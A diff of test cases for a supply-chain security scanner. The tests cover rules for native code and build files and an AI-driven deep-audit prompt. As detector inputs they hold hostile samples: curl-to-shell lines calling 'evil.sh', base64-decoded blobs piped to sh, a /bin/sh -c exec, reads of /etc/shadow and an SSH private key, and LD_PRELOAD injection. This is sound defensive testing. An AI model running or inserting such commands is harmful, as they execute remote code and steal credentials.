@@ -1063,6 +1063,17 @@ async function supplyChainSuite() {
       && sc.classifyForScan('app.py') === 'source');
     check('scan: a README or an image is not scanned',
       sc.classifyForScan('README.md') === null && sc.classifyForScan('logo.png') === null);
+    // The allowlist is gone: a language nobody enumerated is no longer invisible.
+    // This is the whole point of a general-purpose auditor.
+    check('scan: a language not in any old allowlist (Lua, Elixir, Perl, Zig) is now read',
+      sc.classifyForScan('init.lua') === 'source' && sc.classifyForScan('app.ex') === 'source'
+      && sc.classifyForScan('run.pl') === 'source' && sc.classifyForScan('main.zig') === 'source');
+    check('scan: a file with no extension is read, not skipped',
+      sc.classifyForScan('LICENSE') === 'source' && sc.classifyForScan('install') === 'source');
+    check('scan: stylesheets, prose and tabular data are still skipped — base64/URL noise, no code',
+      sc.classifyForScan('styles.css') === null && sc.classifyForScan('theme.scss') === null
+      && sc.classifyForScan('notes.rst') === null && sc.classifyForScan('data.csv') === null
+      && sc.classifyForScan('icon.svg') === null);
 
     // scanFile marks a recently-changed file, which the walk uses to sort.
     const marked = sc.scanFile({ name: 'x.js', rel: 'src/x.js', content: 'const k = fs.readFileSync(process.env.HOME + "/.ssh/id_rsa")', changed: true });
@@ -1086,6 +1097,61 @@ async function supplyChainSuite() {
     check('source scan: a fetch to an external host IS worth a glance (medium)',
       sc.scanSourceFile('fetch("https://api.example.com/x")', 'a.js').some(f => f.id === 'suspicious-network' && f.severity === 'medium'));
 
+    // Native languages (C/C++, Java, …). A compiled project was skipped whole
+    // until its extensions were added; and even read, its backdoors look nothing
+    // like a JS one, so the native rules describe native constructs.
+    check('scan: a .c file is now read, not skipped',
+      sc.classifyForScan('main.c') === 'source' && sc.classifyForScan('app.cpp') === 'source' && sc.classifyForScan('h.hpp') === 'source');
+    check('scan: Java/C#/Swift are read too',
+      sc.classifyForScan('A.java') === 'source' && sc.classifyForScan('B.cs') === 'source' && sc.classifyForScan('C.swift') === 'source');
+    const cscan = (code) => sc.scanSourceFile(code, 'x.c').map(f => f.id);
+    check('C scan: system() on a runtime value is a shell-exec construct',
+      cscan('int main(){ system(cmd); }').includes('shell-exec-native'));
+    check('C scan: exec of /bin/sh -c is flagged',
+      cscan('execl("/bin/sh", "sh", "-c", payload, NULL);').includes('shell-exec-native'));
+    check('C scan: system("make") — a literal command — is NOT flagged',
+      !cscan('system("make all");').includes('shell-exec-native'));
+    check('C scan: reading /etc/shadow is credential access',
+      cscan('FILE* s = fopen("/etc/shadow", "r");').includes('credential-access'));
+    check('C scan: fopen on an ordinary file is NOT flagged',
+      sc.scanSourceFile('FILE* f = fopen("config.json", "r");', 'x.c').length === 0);
+    check('C scan: an LD_PRELOAD injection is flagged',
+      cscan('setenv("LD_PRELOAD", lib, 1);').includes('library-preload'));
+    check('C scan: dlopen of a runtime path is flagged',
+      cscan('void* h = dlopen(path, RTLD_NOW);').includes('library-preload'));
+    check('C scan: a hardcoded PUBLIC IP in a network call is flagged',
+      cscan('addr.sin_addr.s_addr = inet_addr("185.220.101.5");').includes('hardcoded-ip-connection'));
+    check('C scan: a loopback or private IP is NOT flagged',
+      !cscan('gethostbyname("127.0.0.1");').includes('hardcoded-ip-connection')
+      && !cscan('gethostbyname("192.168.1.1");').includes('hardcoded-ip-connection')
+      && !cscan('inet_addr("10.0.0.5");').includes('hardcoded-ip-connection'));
+    check('C scan: plain arithmetic is clean',
+      sc.scanSourceFile('int add(int a,int b){return a+b;}', 'm.c').length === 0);
+    check('Java scan: System.out.println is NOT a shell exec',
+      !sc.scanSourceFile('System.out.println("hi");', 'A.java').some(f => f.id === 'shell-exec-native'));
+
+    // Build files — where the C/C++ supply-chain attack actually lives (the
+    // xz/liblzma backdoor was in the build, not the .c files).
+    const bscan = (code, name) => sc.scanBuildFile(code, name || 'Makefile').map(f => f.id);
+    check('scan: Makefile/CMake/Dockerfile/configure are recognised as build files',
+      sc.classifyForScan('Makefile') === 'buildfile' && sc.classifyForScan('CMakeLists.txt') === 'buildfile'
+      && sc.classifyForScan('Dockerfile') === 'buildfile' && sc.classifyForScan('configure') === 'buildfile'
+      && sc.classifyForScan('build.gradle') === 'buildfile' && sc.classifyForScan('deps.cmake') === 'buildfile');
+    check('build scan: a step that pipes curl into a shell is HIGH',
+      bscan('setup:\n\tcurl https://evil.sh/x | bash\n').includes('build-remote-execution'));
+    check('build scan: a decoded blob piped into a shell is HIGH',
+      bscan('\tcat blob | base64 -d | sh\n').includes('build-remote-execution'));
+    check('build scan: a Dockerfile RUN curl | sh is HIGH',
+      bscan('RUN curl -fsSL https://x/i.sh | sh', 'Dockerfile').includes('build-remote-execution'));
+    check('build scan: a plain download is a medium fetch, not high',
+      bscan('dep:\n\tcurl -o dep.tgz https://example.com/dep.tgz\n').includes('build-network-fetch'));
+    check('build scan: a curl|sh line is not ALSO counted as a plain fetch (no double-flag)',
+      !bscan('\tcurl https://x | sh\n').includes('build-network-fetch'));
+    check('build scan: an ordinary gcc build is clean',
+      sc.scanBuildFile('all:\n\tgcc -O2 -o app main.c\n\ntest:\n\t./app\n', 'Makefile').length === 0);
+    check('build scan: a curl|sh inside a # comment is NOT flagged',
+      sc.scanBuildFile('# do not: curl https://x | sh\nall:\n\tgcc main.c\n', 'Makefile').length === 0);
+
     // The summary the model is handed.
     const summary = sc.summarizeScan([
       { file: 'a', severity: 'low', id: 'external-package', why: 'x', match: 'npm i' },
@@ -1106,6 +1172,19 @@ async function supplyChainSuite() {
       /exfiltration/.test(tri) && /credentials/.test(tri));
     check('triage prompt: tells the model NOT to manufacture findings',
       /not to invent|do not manufacture/i.test(tri));
+
+    // The DEEP prompt cuts the leash: hints not ceiling, real tools, grounded.
+    const deep = sc.deepAuditPrompt(summary, { changed: ['src/touched.js'], manifests: ['package.json', 'go.mod'] });
+    check('deep prompt: treats the pattern scan as HINTS, not the whole picture',
+      /HINTS/.test(deep) && /DEEP supply-chain security audit/.test(deep));
+    check('deep prompt: tells the model to actually read the project with its tools',
+      /read_file/.test(deep) && /list_files/.test(deep) && /git/.test(deep));
+    check('deep prompt: seeds the recently-changed files and the manifests it found',
+      /src\/touched\.js/.test(deep) && /go\.mod/.test(deep));
+    check('deep prompt: still demands grounding — quote the line, do not invent',
+      /QUOTE the actual line/.test(deep) && /Do NOT invent/.test(deep));
+    check('deep prompt: a clean pattern scan still says investigate anyway',
+      /Investigate anyway/.test(sc.deepAuditPrompt(sc.summarizeScan([], { scanned: 5 }), {})));
   }
 
   // ── End to end through the real walk, on a real temp project. ────────────
@@ -1156,9 +1235,21 @@ async function supplyChainSuite() {
       let called3 = false;
       p3.askNavy = async () => { called3 = true; };
       const cleanResult = await p3.runProjectAudit();
-      check('audit e2e: a clean project reports clean and spends NO model call',
+      check('audit e2e: a clean project reports clean and spends NO model call (light mode)',
         cleanResult && cleanResult.total === 0 && called3 === false
         && posted3.some(m => m.type === 'auditResult'));
+
+      // Deep mode: the agentic audit runs EVEN on a clean scan — a fixed set of
+      // patterns finding nothing proves little — and hands over the DEEP prompt.
+      let deepPrompt = null;
+      p3.askNavy = async (prm) => { deepPrompt = prm; };
+      await p3.runProjectAudit(true);
+      check('audit e2e: /audit deep runs the model even on a clean scan',
+        typeof deepPrompt === 'string' && deepPrompt.length > 0);
+      check('audit e2e: deep mode hands over the DEEP prompt, not the triage prompt',
+        /DEEP supply-chain security audit/.test(deepPrompt) && /read_file/.test(deepPrompt));
+      check('audit e2e: the deep card marks itself so the panel can say so',
+        posted3.some(m => m.type === 'auditResult' && m.deep === true));
       try { p3.dispose?.(); } catch {}
       try { fs.rmSync(clean, { recursive: true, force: true }); } catch {}
     } finally {
